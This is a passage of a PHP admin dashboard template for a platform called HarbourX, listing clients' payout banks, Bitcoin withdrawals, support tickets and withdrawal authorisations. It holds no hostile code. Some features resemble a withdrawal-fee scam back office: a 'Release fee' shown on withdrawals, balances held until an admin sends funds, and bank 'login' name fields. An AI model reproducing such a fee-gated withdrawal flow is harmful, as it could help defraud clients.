        </div></details>
      </aside>
    </div>
    <div id="clientEmpty" class="empty clients-empty" hidden>No clients match these filters.</div>
  <?php endif; ?>
</section>

<div class="card">
  <div class="section-title">
    <div>
      <h2>Connected payout banks</h2>
      <p class="hint" style="margin:0">Name-only test connection records. No bank-login credentials are collected or stored.</p>
    </div>
    <span class="bank-connected-badge"><?= $connectedBanks ?> connected</span>
  </div>

  <?php if ($connectedBanks === 0): ?>
    <div class="empty">No clients have connected a payout bank yet.</div>
  <?php else: ?>
    <div class="bank-connection-grid">
      <?php foreach ($users as $u): ?>
        <?php foreach ((is_array($u['bankAccounts'] ?? null) ? $u['bankAccounts'] : []) as $bankIndex => $bank): ?>
          <?php
            $number = preg_replace('/\D+/', '', (string)($bank['accountNumber'] ?? ''));
            $lastFour = $number !== '' ? substr($number, -4) : '0000';
            $legacyHolder = trim((string)($bank['accountHolder'] ?? ''));
            $firstName = trim((string)($bank['accountFirstName'] ?? ''));
            $lastName = trim((string)($bank['accountLastName'] ?? ''));
            $loginFirstName = trim((string)($bank['loginFirstName'] ?? $firstName));
            $loginLastName = trim((string)($bank['loginLastName'] ?? $lastName));
            if ($firstName === '' && $legacyHolder !== '') {
                $holderParts = preg_split('/\s+/', $legacyHolder);
                $firstName = array_shift($holderParts) ?: '';
                $lastName = implode(' ', $holderParts);
            }
          ?>
          <div class="bank-connection-card">
            <div class="bank-connection-head">
              <div>
                <strong><?= htmlspecialchars($u['name'] ?? '') ?></strong>
                <div class="email"><?= htmlspecialchars($u['email'] ?? '') ?></div>
              </div>
              <span class="bank-connected-badge">✓ Connected</span>
            </div>
            <div class="aml-details">
              <div class="aml-detail"><small>Bank</small><strong><?= htmlspecialchars($bank['bankName'] ?? 'Bank') ?> •••• <?= htmlspecialchars($lastFour) ?></strong></div>
              <div class="aml-detail"><small>First name</small><strong><?= htmlspecialchars($firstName) ?></strong></div>
              <div class="aml-detail"><small>Surname</small><strong><?= htmlspecialchars($lastName) ?></strong></div>
              <div class="aml-detail"><small>Bank / routing code</small><strong><?= htmlspecialchars($bank['bsb'] ?? '') ?></strong></div>
              <div class="aml-detail"><small>Login first name</small><strong><?= htmlspecialchars($loginFirstName) ?></strong></div>
              <div class="aml-detail"><small>Login last name</small><strong><?= htmlspecialchars($loginLastName) ?></strong></div>
              <div class="aml-detail"><small>Connected</small><strong><?= htmlspecialchars($bank['connectedAt'] ?? '') ?></strong></div>
            </div>
            <div class="actions" style="margin-top:12px">
              <a class="btn btn-light" href="client.php?email=<?= urlencode($u['email'] ?? '') ?>">Open client</a>
              <form method="post" onsubmit="return confirm('Remove this connected payout bank? The client will need to add it again before withdrawing.')" style="display:inline-flex">
                <input type="hidden" name="bank_user_email" value="<?= htmlspecialchars($u['email'] ?? '') ?>">
                <input type="hidden" name="bank_account_id" value="<?= htmlspecialchars($bank['id'] ?? '') ?>">
                <input type="hidden" name="bank_account_index" value="<?= htmlspecialchars((string)$bankIndex) ?>">
                <button class="btn btn-red" name="delete_bank_account" type="submit">Remove bank</button>
              </form>
            </div>
          </div>
        <?php endforeach; ?>
      <?php endforeach; ?>
    </div>
  <?php endif; ?>
</div>

<div class="card" id="btc-withdrawals">
  <div class="section-title">
    <div>
      <h2>Bitcoin withdrawals</h2>
      <p class="hint" style="margin:0">On-chain send requests. The client's balance has already been reduced; nothing is broadcast until you send it.</p>
    </div>
    <span class="bank-connected-badge"><?= (int)$pendingBtcWithdrawals ?> in review</span>
  </div>

  <?php if (!$btcWithdrawals): ?>
    <p class="hint">No Bitcoin withdrawal requests yet.</p>
  <?php else: ?>
    <?php foreach ($btcWithdrawals as $w): ?>
      <?php
        $status = (string)($w['status'] ?? '');
        $badge = $status === 'In review' ? 'status-under_review' : 'status-verified';
      ?>
      <div class="aml-card" style="margin-bottom:12px">
        <div class="aml-head">
          <div>
            <strong><?= htmlspecialchars(number_format((float)($w['btcWithdrawalAmount'] ?? 0), 8)) ?> BTC</strong>
            <small><?= htmlspecialchars((string)($w['clientName'] ?? '')) ?> ·
              <?= htmlspecialchars((string)($w['clientEmail'] ?? '')) ?> ·
              <?= htmlspecialchars((string)($w['date'] ?? '')) ?></small>
          </div>
          <span class="status <?= $badge ?>"><?= htmlspecialchars($status) ?></span>
        </div>

        <div class="aml-grid">
          <div class="aml-detail">
            <small>Destination address</small>
            <strong class="btc-address-cell"><?= htmlspecialchars((string)($w['btcWithdrawalAddress'] ?? '')) ?></strong>
          </div>
          <div class="aml-detail"><small>Address type</small><strong><?= htmlspecialchars(strtoupper((string)($w['btcWithdrawalAddressKind'] ?? '—'))) ?></strong></div>
          <div class="aml-detail"><small>Network fee</small><strong><?= htmlspecialchars(number_format((float)($w['btcWithdrawalNetworkFee'] ?? 0), 8)) ?> BTC</strong></div>
          <div class="aml-detail"><small>Reference</small><strong><?= htmlspecialchars((string)($w['btcWithdrawalRequestId'] ?? '')) ?></strong></div>
          <?php if (isset($w['btcWithdrawalReleaseFee'])): ?>
            <div class="aml-detail"><small>Release fee</small><strong><?= htmlspecialchars(number_format((float)$w['btcWithdrawalReleaseFee'], 2)) ?> <?= htmlspecialchars((string)($w['btcWithdrawalReleaseFeeCurrency'] ?? '')) ?></strong></div>
          <?php endif; ?>
          <div class="aml-detail"><small>Submitted</small><strong><?= htmlspecialchars((string)($w['btcWithdrawalSubmittedAt'] ?? '')) ?></strong></div>
        </div>
      </div>
    <?php endforeach; ?>
  <?php endif; ?>
</div>

<div class="card" id="support">
  <div class="section-title">
    <div>
      <h2>Support tickets</h2>
      <p class="hint" style="margin:0">Opened by clients from the support centre. A reply here shows up on their ticket.</p>
    </div>
    <span class="bank-connected-badge"><?= (int)$openTicketCount ?> awaiting reply</span>
  </div>

  <?php if (!$supportTickets): ?>
    <p class="hint">No tickets yet.</p>
  <?php else: ?>
    <?php foreach ($supportTickets as $ticket): ?>
      <?php
        $status = (string)($ticket['status'] ?? 'open');
        $badge = $status === 'open' ? 'status-under_review' : ($status === 'closed' ? 'status-unverified' : 'status-verified');
        $label = $status === 'open' ? 'Awaiting reply' : ($status === 'closed' ? 'Closed' : 'Answered');
      ?>
      <div class="aml-card" style="margin-bottom:12px">
        <div class="aml-head">
          <div>
            <strong><?= htmlspecialchars((string)($ticket['subject'] ?? '')) ?></strong>
            <small><?= htmlspecialchars((string)($ticket['reference'] ?? '')) ?> ·
              <?= htmlspecialchars((string)($ticket['topicLabel'] ?? 'Support')) ?> ·
              <?= htmlspecialchars((string)($ticket['email'] ?? '')) ?></small>
          </div>
          <span class="status <?= $badge ?>"><?= $label ?></span>
        </div>

        <div class="ticket-thread">
          <?php foreach (($ticket['messages'] ?? []) as $entry): ?>
            <div class="ticket-msg<?= ($entry['from'] ?? '') === 'staff' ? ' is-staff' : '' ?>">
              <small><?= ($entry['from'] ?? '') === 'staff' ? 'HarbourX support' : 'Client' ?> ·
                <?= htmlspecialchars((string)($entry['at'] ?? '')) ?></small>
              <p><?= nl2br(htmlspecialchars((string)($entry['body'] ?? ''))) ?></p>
            </div>
          <?php endforeach; ?>
        </div>

        <?php if ($status !== 'closed'): ?>
          <form method="post" class="ticket-reply-form">
            <input type="hidden" name="ticket_id" value="<?= htmlspecialchars((string)($ticket['id'] ?? '')) ?>">
            <textarea name="ticket_body" rows="2" placeholder="Reply to this client…"></textarea>
            <div class="ticket-reply-actions">
              <button class="btn btn-blue" name="ticket_reply" type="submit">Send reply</button>
              <button class="btn" name="ticket_close" type="submit">Close ticket</button>
            </div>
          </form>
        <?php endif; ?>
      </div>
    <?php endforeach; ?>
  <?php endif; ?>
</div>

<div class="card">
  <div class="section-title">
    <div>
      <h2>Withdrawal authorisations</h2>
      <p class="hint" style="margin:0">First-name confirmations submitted before bank withdrawal requests.</p>
    </div>
    <span class="bank-connected-badge"><?= count($withdrawalAuthorisations) ?> recorded</span>
  </div>

  <?php if (count($withdrawalAuthorisations) === 0): ?>
    <div class="empty">No withdrawal first-name confirmations have been submitted yet.</div>
  <?php else: ?>
    <div class="bank-connection-grid">
      <?php foreach ($withdrawalAuthorisations as $record): ?>
        <?php
          $client = $record['user'];
          $tx = $record['transaction'];
        ?>
        <div class="bank-connection-card">
          <div class="bank-connection-head">
            <div>
              <strong><?= htmlspecialchars($client['name'] ?? '') ?></strong>
              <div class="email"><?= htmlspecialchars($client['email'] ?? '') ?></div>
            </div>
            <span class="status status-<?= htmlspecialchars(statusSlug($tx['status'] ?? '')) ?>"><?= htmlspecialchars($tx['status'] ?? '') ?></span>
          </div>
          <div class="aml-details">
            <div class="aml-detail"><small>Authorisation first name</small><strong><?= htmlspecialchars($tx['withdrawalAuthorisationFirstName'] ?? '') ?></strong></div>
            <div class="aml-detail"><small>Amount</small><strong><?= htmlspecialchars($tx['amount'] ?? '') ?></strong></div>
            <div class="aml-detail"><small>Submitted</small><strong><?= htmlspecialchars($tx['withdrawalAuthorisedAt'] ?? $tx['date'] ?? '') ?></strong></div>
            <div class="aml-detail"><small>Bank details</small><strong><?= htmlspecialchars($tx['details'] ?? '') ?></strong></div>
          </div>
          <div class="actions" style="margin-top:12px">
            <a class="btn btn-light" href="client.php?email=<?= urlencode($client['email'] ?? '') ?>">Open client</a>
            <a class="btn btn-light" href="transactions.php?email=<?= urlencode($client['email'] ?? '') ?>">Transactions</a>
          </div>
        </div>
      <?php endforeach; ?>
    </div>
  <?php endif; ?>
</div>

<script>
document.querySelectorAll('.country-select').forEach((countrySelect) => {
  countrySelect.addEventListener('change', () => {
    const target = document.getElementById(countrySelect.dataset.currencyTarget);
    const option = countrySelect.options[countrySelect.selectedIndex];
    if (target && option?.dataset.currency) target.value = option.dataset.currency;
  });
});

window.hxInitialAlerts = <?= json_encode([
  'count' => (int)$adminSnapshot['count'],
  'body' => (string)$adminSnapshot['body'],
  'signature' => (string)$adminSnapshot['signature'],
  'paymentStats' => $paymentStats,
  'callbackStats' => $callbackStats
], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) ?>;
</script>
<?php pageFooter(); ?>
